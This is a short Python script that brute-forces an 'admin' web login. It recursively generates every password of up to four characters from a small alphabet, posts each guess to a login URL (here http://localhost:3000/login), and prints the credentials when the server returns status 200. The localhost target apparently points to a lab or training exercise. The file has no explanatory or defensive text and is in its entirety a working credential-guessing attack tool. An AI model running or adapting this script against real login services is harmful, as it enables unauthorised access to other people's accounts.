import requests

alphabet = "acdeijloprs"


def brute_force_attack(url, pwd):

    if len(pwd) < 4:
        for c in alphabet:
            password = pwd + c
            data = {
                "username": "admin",
                "password": password
            }
            response = requests.post(url, data=data)
            if response.status_code == 200:
                print("Username: admin")
                print("Password:", password)
                return 0
            if not brute_force_attack(url, password):
                return 0
    return 1

if __name__ == "__main__":
    url = "http://localhost:3000/login"
    
    brute_force_attack(url, "")    
